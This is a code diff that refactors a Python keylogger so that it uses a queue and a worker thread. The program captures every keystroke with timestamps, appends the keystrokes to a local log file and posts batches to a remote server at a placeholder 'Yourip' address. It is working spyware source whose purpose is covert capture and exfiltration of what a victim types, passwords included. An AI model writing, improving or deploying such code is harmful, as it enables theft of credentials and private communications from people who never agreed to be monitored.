@@ -3,35 +3,33 @@ import requests
 from pynput import keyboard
 import threading
 import time
+from queue import Queue
 
 # Configuration
 log_file_path = "keystroke_log.txt"
-server_url = "http://yourip:8080/receive_keystrokes"
+server_url = "http://Yourip:8080/receive_keystrokes"
 buffer_size = 10  # Send buffer when it reaches this size
 send_interval = 5  # Seconds, send buffer at this interval if not full
 
 class KeyLogger:
     def __init__(self):
-        self.buffer = []
-        self.lock = threading.Lock()
-        self.sender_thread = threading.Thread(target=self.periodic_send)
-        self.sender_thread.daemon = True  # So it stops when main thread stops
-        self.sender_thread.start()
+        self.queue = Queue()
+        self.stop_event = threading.Event()
+        self.worker_thread = threading.Thread(target=self.process_queue)
+        self.worker_thread.daemon = True  # Ensure thread stops when main program stops
+        self.worker_thread.start()
 
     def on_press(self, key):
         try:
             keystroke_data = f"{datetime.datetime.now()} - {key.char}\n"
         except AttributeError:
             keystroke_data = f"{datetime.datetime.now()} - {key}\n"
-        
-        with self.lock:
-            self.buffer.append(keystroke_data)
-            if len(self.buffer) >= buffer_size:
-                self.flush_buffer()
+        self.queue.put(keystroke_data)
 
     def on_release(self, key):
         if key == keyboard.Key.esc:
             # Stop listener on Esc key press
+            self.stop_event.set()
             return False
 
     def send_data_to_server(self, data):
@@ -43,27 +41,38 @@ class KeyLogger:
         except requests.exceptions.RequestException as e:
             print(f"Error sending data: {e}")
 
-    def flush_buffer(self):
-        with self.lock:
-            buffer_copy = ''.join(self.buffer)
-            self.buffer.clear()
-            threading.Thread(target=self.send_data_to_server, args=(buffer_copy,)).start()
-            # Optionally, log to file in a separate thread to avoid blocking
-            threading.Thread(target=self.log_to_file, args=(buffer_copy,)).start()
-
     def log_to_file(self, data):
         with open(log_file_path, "a") as log_file:
             log_file.write(data)
 
-    def periodic_send(self):
-        while True:
-            time.sleep(send_interval)
-            with self.lock:
-                if self.buffer:
-                    buffer_copy = ''.join(self.buffer)
-                    self.buffer.clear()
-                    threading.Thread(target=self.send_data_to_server, args=(buffer_copy,)).start()
-                    threading.Thread(target=self.log_to_file, args=(buffer_copy,)).start()
+    def process_queue(self):
+        buffer = []
+        last_send_time = time.time()
+
+        while not self.stop_event.is_set():
+            try:
+                # Get keystroke from the queue with a timeout to allow periodic checks
+                keystroke_data = self.queue.get(timeout=0.1)
+                buffer.append(keystroke_data)
+
+                # If buffer reaches the size limit, process it
+                if len(buffer) >= buffer_size:
+                    self.process_buffer(buffer)
+                    buffer = []
+            except:
+                # Timeout occurred, check if we need to process the buffer
+                if buffer and time.time() - last_send_time >= send_interval:
+                    self.process_buffer(buffer)
+                    buffer = []
+
+        # Process any remaining data in the buffer
+        if buffer:
+            self.process_buffer(buffer)
+
+    def process_buffer(self, buffer):
+        data = ''.join(buffer)
+        self.log_to_file(data)
+        self.send_data_to_server(data)
 
 # Collect events until released
 key_logger = KeyLogger()
